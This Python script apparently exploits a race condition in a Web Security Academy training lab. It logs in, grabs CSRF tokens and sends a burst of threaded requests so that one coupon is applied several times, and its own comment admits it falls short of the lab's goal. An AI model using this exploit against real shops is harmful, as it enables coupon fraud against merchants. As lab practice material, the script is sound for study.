import requests
import threading
import time

DOMAIN = "0a0e0008038b29ff833555ea00b6000c.web-security-academy.net"

HEADERS = {
    "Host": f"{DOMAIN}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "close",
    "Referer": f"https://{DOMAIN}/login",
    "Upgrade-Insecure-Requests": "1",
    "Cookie": ""
}

logged_in_csrf = ""
coupon_applied_error = False
coupon_applied_success = 0

def get_csrf_token_login():
    url = f"https://{DOMAIN}/login"
    response = requests.get(url)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    return csrf_token

def login():
    csrf_token = get_csrf_token_login()
    url = f"https://{DOMAIN}/login"
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
        print("Logged in successfully", HEADERS["Cookie"].split("=")[1])

def add_to_cart():
    url = f"https://{DOMAIN}/cart"
    data = {
        "productId": "1",
        "redir": "PRODUCT",
        "quantity": "1"
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Added to cart successfully")

def get_csrf_token_logged_in():
    global logged_in_csrf

    url = f"https://{DOMAIN}/my-account"
    response = requests.get(url, headers=HEADERS)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    
    logged_in_csrf = csrf_token

def get_cart_info():
    url = f"https://{DOMAIN}/cart"
    response = requests.get(url, headers=HEADERS)
    # print(response.text)

def apply_coupon():
    # print(time.time(), end=" ")
    response = requests.post("https://0a0e0008038b29ff833555ea00b6000c.web-security-academy.net/cart/coupon", headers=HEADERS, data={"csrf": logged_in_csrf, "coupon": "PROMO20"}, allow_redirects=False)
    # print(time.time())
    if response.headers["Location"] == "/cart":
        print("Coupon applied successfully")
        global coupon_applied_success
        coupon_applied_success += 1
    else:
        print(response.headers["Location"].split("couponError=")[1].split("&")[0])

def remove_coupon():
    requests.post(f"https://{DOMAIN}/cart/coupon/remove", headers=HEADERS, data={"csrf": logged_in_csrf, "coupon": "PROMO20"}, allow_redirects=False)

def exploit_race_condition():
    global coupon_applied_success

    while coupon_applied_success < 3:
        coupon_applied_success = 0
        remove_coupon()
        
        threads = []
        for i in range(12):
            threads.append(threading.Thread(target=apply_coupon))
            threads[i].start()
        
        for i in range(12):
            threads[i].join()
        
        
    print(HEADERS["Cookie"].split("=")[1])
            
# Unfortunatly, the exploit can successfully apply one coupon maximum 3 times, but to solve the lab, we need to apply it more than 20 times.
get_csrf_token_logged_in()
add_to_cart()
get_cart_info()
exploit_race_condition()